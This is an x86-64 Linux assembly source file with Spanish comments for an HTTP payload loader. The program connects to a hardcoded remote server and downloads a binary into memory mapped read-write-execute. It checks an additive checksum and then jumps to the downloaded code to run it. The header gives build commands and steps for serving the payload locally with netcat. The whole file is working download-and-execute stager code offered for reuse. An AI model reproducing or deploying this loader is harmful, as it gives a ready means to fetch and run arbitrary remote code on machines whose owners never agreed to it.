;========================================================================================================================================================
; Archivo      : http-payload-loader-full-dynamic-checksum.asm
; Creado       : 26/02/2025
; Modificado   : 26/02/2025
; Autor        : Gastón M. González
; Plataforma   : Linux
; Arquitectura : x86-64
;========================================================================================================================================================
; Descripción  : Loader de payload vía HTTP (no HTTPS), TOTALMENTE DINÁMICO, capaz de manejar payloads de tamaño variable sin límites
;                predefinidos, con verificación de integridad mediante checksum.
;
;                Descarga un payload extendido con información adicional que permite verificar su integridad:
;                • Checksum aditivo global de 3 bytes (little endian) para verificar la integridad del payload.
;
;                El archivo que se descarga está estructurado de la siguiente manera:
;                ┌────────────────────────────┬────────────────────────┐
;                │      Payload original      │ Checksum (3 bytes, LE) │
;                └────────────────────────────┴────────────────────────┘
;                La información adicional es incorporada utilizando el script payloadextend.sh
;
;                Para este ejemplo, se debe generar el payload extendido ejecutando: ./payloadextend.sh --checksum <archivo-payload>
;                Ejemplo: /payloadextend.sh --checksum payload4KBlarger.bin
;
;                Explicación detallada en:
;                • https://github.com/Pithase/asm-payloads-loaders/blob/main/bin/README.md
;                • https://github.com/Pithase/asm-payloads-loaders/blob/main/payloadextend.sh
;
; Compilar     : nasm -f elf64 http-payload-loader-full-dynamic-checksum.asm -o http-payload-loader-full-dynamic-checksum.o
; Linkear      : ld http-payload-loader-full-dynamic-checksum.o -o http-payload-loader-full-dynamic-checksum
; Ejecutar     : ./http-payload-loader-full-dynamic-checksum
; Ejecutar     : ./http-payload-loader-full-dynamic-checksum ; echo "Código de salida:" $?
;========================================================================================================================================================
; Instrucciones para ejecutar en un entorno local
;========================================================================================================================================================
; Para ejecutar este código en un entorno local, aplique los siguientes cambios:
;
; • Modificar la solicitud HTTP para que apunte a un servidor local:
;          http_get db "GET /bin/payload4KBlarger-ext-c.bin HTTP/1.1", 0x0D, 0x0A
;   por -> http_get db "GET /payload4KBlarger-ext-c.bin HTTP/1.1", 0x0D, 0x0A
;
; • Cambiar el host a localhost:
;          db "Host: pithase.com.ar", 0x0D, 0x0A
;   por -> db "Host: localhost", 0x0D, 0x0A
;
; • Ajustar la IP del servidor para que apunte a localhost:
;          server_ip    equ 0xB6783AC8   ; IP [200.58.120.182] del servidor en little endian
;   por -> server_ip    equ 0x0100007F   ; IP [127.0.0.1] en little endian
;
; • Cambiar el puerto a 8000 (para servir el archivo con Netcat)
;          http_port    equ 0x5000       ; puerto 80 en little endian
;   por -> http_port    equ 0x401f       ; puerto 8000 en little endian
;
; En una terminal, inicia un servidor Netcat para servir el archivo de payload.
;
; Posiciónate en el directorio donde se encuentra el payload y ejecuta: nc -l -p 8000 <archivo-payload>
; Ejemplo de uso: nc -l -p 8000 payload4KBlarger-ext-c.bin
;
; En otra terminal, ejecuta este programa después de compilarlo y linkearlo.
;========================================================================================================================================================
; Licencia MIT:
; Este código es de uso libre bajo los términos de la Licencia MIT.
; Puedes usarlo, modificarlo y redistribuirlo, siempre que incluyas esta nota de atribución.
; NO HAY GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA.
; Licencia completa en: https://github.com/Pithase/asm-payloads-loaders/blob/main/LICENSE
;========================================================================================================================================================

section .rodata
    http_get db "GET /bin/payload4KBlarger-ext-c.bin HTTP/1.1", 0x0D, 0x0A
             db "Host: pithase.com.ar", 0x0D, 0x0A
             db "Connection: close", 0x0D, 0x0A
             db 0x0D, 0x0A, 0                    ; solicitud HTTP GET formateada como exige el protocolo HTTP
    http_get_len equ $ - http_get                ; longitud de la cadena almacenada en http_get

    server_ip    equ 0xB6783AC8                  ; IP [200.58.120.182] del servidor en little endian
    http_port    equ 0x5000                      ; puerto 80 en little endian

    content_length db "content-length:"          ; cadena a buscar para obtener tamaño del payload
    content_length_len equ $ - content_length    ; longitud de la cadena almacenada en content_length

section .bss
    sockfd            resq 1                     ; descriptor del socket
    buffer            resb 1024                  ; buffer de lectura HTTP
    exec_mem          resq 1                     ; memoria ejecutable reservada con mmap
    payload_size      resq 1                     ; se almacenará el valor extraído de Content-Length
    payload_start     resq 1                     ; inicio del payload
    expected_checksum resq 1                     ; checksum espera, se toma del payload descargado
    bytes_leidos      resq 1                     ; cantidad total de bytes leídos en memoria

section .text
    global _start

_start:
    ;============================================================================================================================
    ; 1. Crea un socket (socket(AF_INET, SOCK_STREAM, 0))
    ;============================================================================================================================
    mov rax, 41                          ; syscall: socket()
    mov rdi, 2                           ; AF_INET -> IPv4
    mov rsi, 1                           ; SOCK_STREAM -> TCP (orientado a conexión)
    mov rdx, 0                           ; protocolo predeterminado (IPPROTO_TCP para SOCK_STREAM)
    syscall

    test rax, rax                        ; verifica si se creó el socket con éxito
    js socket_error                      ; si fue sin éxito, salta a manejo de error
    mov [sockfd], rax                    ; guarda el descriptor del socket en la variable sockfd

    ;============================================================================================================================
    ; 2. Configura sockaddr_in
    ;============================================================================================================================
    sub rsp, 16                          ; reserva espacio en la pila para la estructura sockaddr_in (16 bytes)
    mov word [rsp], 2                    ; sin_family = AF_INET (Protocolo IPv4)
    mov word [rsp+2], http_port          ; puerto 80 del servidor en little endian
    mov dword [rsp+4], server_ip         ; IP del servidor en little endian
    mov qword [rsp+8], 0                 ; rellena el resto de la estructura con ceros (sin usar en este caso)

    ;============================================================================================================================
    ; 3. Conecta al servidor (connect)
    ;============================================================================================================================
    mov rax, 42                          ; syscall: connect()
    mov rdi, [sockfd]                    ; descriptor del socket previamente creado
    mov rsi, rsp                         ; puntero a la estructura sockaddr_in (dirección del servidor)
    mov rdx, 16                          ; tamaño de la estructura sockaddr_in (16 bytes para IPv4)
    syscall

    test rax, rax                        ; verifica si la conexión fue exitosa
    js connect_error                     ; si no fue exitosa, salta al manejo de error

    ;============================================================================================================================
    ; 4. Envía la solicitud HTTP GET
    ;============================================================================================================================
    mov rax, 44                          ; syscall: send() -> enviar datos a través de un socket
    mov rdi, [sockfd]                    ; descriptor del socket previamente creado
    lea rsi, [http_get]                  ; puntero al buffer con la solicitud HTTP GET
    mov rdx, http_get_len                ; longitud de la solicitud HTTP GET
    xor r10, r10                         ; flags = 0 (ninguna opción especial)
    xor r8, r8                           ; en 0 para por seguridad y evitar posibles problemas
    xor r9, r9                           ; en 0 para por seguridad y evitar posibles problemas
    syscall

    test rax, rax                        ; verifica si la solicitud fue exitosa
    js http_get_error                    ; si no fue exitosa, salta al manejo de error

    ;============================================================================================================================
    ; 5. Recibe la respuesta HTTP (máximo 1KB, suficiente para que contenga el HTTP Header)
    ;============================================================================================================================
    mov rax, 45                          ; syscall: recv -> lee datos desde un socket
    mov rdi, [sockfd]                    ; descriptor del socket previamente creado
    lea rsi, [buffer]                    ; dirección del buffer donde almacenar los datos recibidos
    mov rdx, 1024                        ; número máximo de bytes a leer
    xor r10, r10                         ; flags (0 para una lectura estándar sin opciones adicionales)
    xor r8, r8                           ; en 0 para por seguridad y evitar posibles problemas
    xor r9, r9                           ; en 0 para por seguridad y evitar posibles problemas
    syscall

    cmp rax, 3                           ; el payload debe tener al menos 4 bytes (1 byte de instrucción + 3 bytes de checksum)
    jle http_response_size_error         ; evita un posible desbordamiento y apuntar a una dirección inválida
    mov r14, rax                         ; contiene la cantidad de bytes leídos

    ;============================================================================================================================
    ; 6. Busca "content-length:" en 'buffer' (comparación case insensitive)
    ;============================================================================================================================
    xor rsi, rsi                         ; rsi = índice de búsqueda en buffer

find_cl:
    cmp rsi, r14                         ; ¿se recorrió todo el buffer recibido?
    jge http_cl_no_match                 ; si es sí, significa que no se encontró "content-length:"
    push rsi                             ; guarda la posición actual de búsqueda en la pila
    mov rcx, content_length_len          ; rcx = longitud de la cadena a buscar
    mov r8, rsi                          ; r8 = índice local en buffer (posición actual)
    mov r9, 0                            ; r9 = índice en la cadena "content-length:"

cl_loop:
    cmp rcx, 0                           ; ¿se compararon todos los caracteres de la subcadena?
    je cl_found                          ; si es sí, se encontró "content-length:"
    mov al, byte [buffer + r8]           ; carga el byte actual del buffer
    cmp al, 'A'                          ; ¿está en el rango de mayúsculas?
    jl cl_no_converter                   ; si es menor, no es una letra mayúscula
    cmp al, 'Z'                          ; ¿está después de 'Z'?
    jg cl_no_converter                   ; si es mayor, no es una letra mayúscula
    add al, 32                           ; convierte a minúscula (ASCII: ['A'->'a',...,'Z'->'z'])

cl_no_converter:
    mov bl, byte [content_length + r9]   ; cargar el byte correspondiente de la subcadena a comparar
    cmp al, bl                           ; ¿coincide con el carácter esperado?
    jne cl_nomatch                       ; si no coincide, sigue buscando en otra posición
    inc r8                               ; avanza en el buffer
    inc r9                               ; avanza en la subcadena
    dec rcx                              ; decrementa el contador de comparación
    jmp cl_loop                          ; continua comparando caracteres

cl_nomatch:
    pop rsi                              ; restaura posición inicial de búsqueda
    inc rsi                              ; avanzar al siguiente byte en buffer
    jmp find_cl                          ; continúa la búsqueda en la siguiente posición

cl_found:
    pop rsi                              ; restaura la última posición válida antes de encontrar la cadena
    add rsi, content_length_len          ; rsi apunta justo después de "content-length:"

    ;============================================================================================================================
    ; 7. Salta espacios/tabuladores
    ;============================================================================================================================
skip_spaces:
    mov al, byte [buffer + rsi]          ; carga el byte actual en AL desde la posición rsi
    cmp al, 32                           ; ¿es un espacio (ASCII 32) ?
    je skip_spaces_inc                   ; si es sí, avanzar al siguiente byte
    cmp al, 9                            ; ¿es un tabulador (ASCII 9)?
    je skip_spaces_inc                   ; si es sí, avanzar al siguiente byte
    jmp parse_number                     ; si no es ni espacio ni tabulador, continua con el parseo del número

skip_spaces_inc:
    inc rsi                              ; incrementa rsi para saltar el carácter
    jmp skip_spaces                      ; repite el proceso hasta encontrar un carácter válido

    ;============================================================================================================================
    ; 8. Parsea el número decimal (Content-Length)
    ;============================================================================================================================
parse_number:
    xor r12, r12                         ; Inicializa r12 en 0 (r12 almacenará el valor de Content-Length)

parse_digit:
    mov al, byte [buffer + rsi]          ; Carga el byte actual del buffer
    cmp al, '0'                          ; ¿es menor que '0'? (no es un dígito)
    jb done_parse                        ; si es menor, termina el parsing
    cmp al, '9'                          ; ¿es mayor que '9'? (no es un dígito)
    ja done_parse                        ; si es mayor, termina el parsing

    imul r12, r12, 10                    ; multiplica r12 por 10 (desplazamiento decimal)
    movzx rax, al                        ; convierte el carácter en un valor de 64 bits
    sub rax, '0'                         ; convierte de ASCII a número (0-9)
    add r12, rax                         ; acumula el valor en r12
    inc rsi                              ; avanza al siguiente byte
    jmp parse_digit                      ; repite el proceso para el siguiente dígito

done_parse:
    mov [payload_size], r12              ; almacena el valor de Content-Length extraído
    add rsi, 4                           ; salta los 4 bytes finales de los saltos de línea (CRLF CRLF)
    mov [payload_start], rsi             ; guarda la posición en el buffer donde comienza el payload

    ;============================================================================================================================
    ; 9. Calcula el tamaño a mapear, alineándolo al siguiente múltiplo de 4096
    ;============================================================================================================================
    mov r13, [payload_size]              ; asigna los bytes que paylaod + cheksum
    mov rax, r13                         ; rax = tamaño del paylaod + cheksum
    add rax, 4095                        ; suma 4095 para garantizar el redondeo hacia arriba
    and rax, 0xFFFFFFFFFFFFF000          ; alínea al siguiente múltiplo de 4096

    ;============================================================================================================================
    ; 10. Reserva memoria ejecutable con mmap
    ;============================================================================================================================
    mov rdi, 0                           ; dirección de memoria sugerida (0 = el sistema elige)
    mov rsi, rax                         ; tamaño a mapear
    mov rdx, 7                           ; protecciones (RWX): PROT_READ | PROT_WRITE | PROT_EXEC
    mov r10, 0x22                        ; flags: MAP_PRIVATE | MAP_ANONYMOUS
    mov r8, -1                           ; descriptor de archivo (-1 porque no se asocia a un archivo)
    mov r9, 0                            ; offset = 0 (obligatorio, pero no relevante con MAP_ANONYMOUS)
    mov rax, 9                           ; syscall: mmap (mapea memoria)
    syscall

    test rax, rax                        ; verifica si mmap falló
    js mmap_error                        ; si mmap falló, salta a manejo de errores
    mov [exec_mem], rax                  ; guarda la dirección base de la memoria asignada

    ;============================================================================================================================
    ; 11. Copia el payload (rcx bytes, desde buffer + rbx) a la memoria reservada
    ;============================================================================================================================
    mov rbx, [payload_start]             ; carga la dirección donde comienza el payload en el buffer
    mov rcx, r14                         ; rcx = cantidad total de bytes recibidos en recv
    sub rcx, qword[payload_start]        ; ajusta rcx para excluir el encabezado HTTP y posicionarse en el payload real
    mov qword[bytes_leidos], 0           ; inicializa el contador de bytes leídos para ser copiados en la memoria reservada
    jmp copy_block

    ;============================================================================================================================
    ; 12. Lee el resto del payload
    ;============================================================================================================================
read_payload_loop:
    mov rax, 45                          ; syscall: recv -> lee datos desde un socket
    mov rdi, [sockfd]                    ; descriptor del socket previamente creado
    lea rsi, [buffer]                    ; dirección del buffer donde almacenar los datos recibidos
    mov rdx, 1024                        ; número máximo de bytes a leer
    xor r10, r10                         ; flags (0 para una lectura estándar sin opciones adicionales)
    xor r8, r8                           ; en 0 para por seguridad y evitar posibles problemas
    xor r9, r9                           ; en 0 para por seguridad y evitar posibles problemas
    syscall

    cmp rax, 0
    je payload_read_done                 ; la cantidad de bytes leídos = 0, significa fin del archivo
    jl  http_get_error                   ; se produjo un error

    mov rcx, rax                         ; asigna la cantidad de bytes leídos
    xor rbx, rbx                         ; limpia rbx (no es necesario aquí, pero se usa más adelante)
    cmp rax, 1024                        ; ¿se leyeron exactamente 1024 bytes?
    je copy_block                        ; si es sí, copiamos el bloque leído completo

    ;============================================================================================================================
    ; 13. Último bloque (menos de 1024 bytes)
    ;     Copia (rbx) bytes a exec_mem a partir del offset almacenado en bytes_leidos
    ;============================================================================================================================
    lea rsi, [buffer]                    ; buffer contiene el último bloque recibido
    mov rdi, [exec_mem]                  ; memoria reservada con mmap
    add rdi, [bytes_leidos]              ; destino: exec_mem + offset actual
    mov rcx, rax                         ; cantidad de bytes leídos en este bloque
    rep movsb                            ; copia rcx bytes desde buffer a la memoria ejecutable
    add qword[bytes_leidos], rax         ; actualiza el offset en exec_mem
    jmp payload_read_done

    ;============================================================================================================================
    ; 14. Copia los bytes léidos a la memoria reservada
    ;============================================================================================================================
copy_block:
    lea rsi, [buffer + rbx]              ; rsi apunta al inicio del payload en el buffer de recepción
    mov rdi, [exec_mem]                  ; rdi apunta a la memoria ejecutable reservada con mma
    add rdi, [bytes_leidos]              ; ajusta rdi al offset donde copiar los datos
    add [bytes_leidos], rcx              ; actualiza el contador de bytes leídos para ser copiados
    rep movsb                            ; copia rcx bytes desde buffer a la memoria ejecutable

    cmp r14, 1024
    je read_payload_loop

    ;============================================================================================================================
    ; 15. Extrae el cheksum (últimos 3 bytes del payload total leído)
    ;============================================================================================================================
payload_read_done:
    mov rbx, [payload_size]              ; se asigna el tamaño total del payload recibido
    sub rbx, 3                           ; excluye los últimos 3 bytes que corresponden al checksum

    mov rsi, [exec_mem]                  ; dirección base de la memoria reservada
    add rsi, rbx                         ; apunta a los últimos 3 bytes (inicio del checksum)
    movzx eax, byte [rsi]                ; extrae el primer byte (LSB)
    movzx edx, byte [rsi+1]              ; extrae el segundo byte
    movzx ecx, byte [rsi+2]              ; extrae el tercer byte (MSB)

    mov r13d, eax                        ; inicializa r13d con el primer byte
    shl edx, 8                           ; desplaza el segundo byte 8 bits a la izquierda
    add r13d, edx                        ; suma el segundo byte a r13d
    shl ecx, 16                          ; desplaza el tercer byte 16 bits a la izquierda
    add r13d, ecx                        ; suma el tercer byte a r13d -> checksum completo en r13d
    mov [expected_checksum], r13d        ; guarda el cheksum extraído

    ;============================================================================================================================
    ; 16. Calcula el checksum aditivo sobre los datos almacenados en exec_mem (payload recibido)
    ;     Se asume que la cantidad total de bytes copiados en exec_mem (payload final) es (Content-Length - 3)
    ;============================================================================================================================
    xor eax, eax                         ; inicializa el acumulador de checksum en 0
    mov rcx, [payload_size]              ; rcx = tamaño total de bytes del payload recibido
    sub rcx, 3                           ; resta los 3 bytes del checksum para obtener el tamaño real del payload
    mov rsi, [exec_mem]                  ; rsi apunta al inicio del payload en la memoria reservada

checksum_loop:
    cmp rcx, 0                           ; verifica si quedan bytes por procesar
    je checksum_done                     ; si no quedan bytes, termina el cálculo del checksum
    movzx edx, byte [rsi]                ; carga el byte actual en edx
    add eax, edx                         ; suma el byte actual al acumulador de checksum
    inc rsi                              ; avanza al siguiente byte
    dec rcx                              ; reduce el contador de bytes restantes
    jmp checksum_loop                    ; repite el proceso hasta que rcx llegue a 0

checksum_done:
    cmp eax, [expected_checksum]         ; compara el checksum calculado con el esperado
    jne checksum_error                   ; si no coinciden, salta a la rutina de error

    ;============================================================================================================================
    ; 17. Cierra el socket
    ;============================================================================================================================
    mov rax, 3                           ; syscall: close (cierra el socket abierto)
    mov rdi, [sockfd]                    ; rdi = descriptor del socket almacenado en sockfd
    syscall

    ;============================================================================================================================
    ; 18. Ejecuta el payload
    ;============================================================================================================================
    call qword [exec_mem]                ; salta a la dirección en exec_mem y ejecuta el payload

    ;============================================================================================================================
    ; 19. Salida: Se alcanza solo si el payload retorna
    ;============================================================================================================================
    mov rax, 60                          ; syscall: exit
    xor rdi, rdi                         ; código de salida 0 (éxito)
    syscall

    ;============================================================================================================================
    ; 20. Manejo de errores: Salida con código distinto según el error
    ;     Se incluye la liberación de recursos (cierre del socket) antes de salir
    ;============================================================================================================================
socket_error:
    mov rdi, 1                           ; fallo en la creación del socket
    jmp exit_error

connect_error:
    mov rdi, 2                           ; fallo en la conexión al servidor
    jmp exit_error

http_get_error:
    mov rdi, 3                           ; fallo en la solicitud HTTP GET
    jmp exit_error

http_response_size_error:
    mov rdi, 4                           ; el tamaño del payload no tienen el mínimo requerido
    jmp exit_error

http_cl_no_match:
    mov rdi, 5                           ; no se encontró la cadena "content-length:"
    jmp exit_error

mmap_error:
    mov rdi, 6                           ; fallo en mmap al asignar la memoria requerida
    jmp exit_error

checksum_error:
    mov rdi, 7                           ; el checksum calculado y el esperado son distintos

exit_error:
    push rdi                             ; guarda el código de error en la pila
    mov rax, [sockfd]                    ; obtiene el descriptor del socket
    cmp rax, 0                           ; verifica si el socket fue abierto
    je exit                              ; si no está abierto, salir
    mov rdi, rax                         ; carga el descriptor en rdi para cerrar el socket
    mov rax, 3                           ; syscall: close (cierra el socket abierto)
    syscall
    pop rdi                              ; restaura el código de error

exit:
    mov rax, 60                          ; syscall: exit
    syscall                              ; termina el proceso con el código en rdi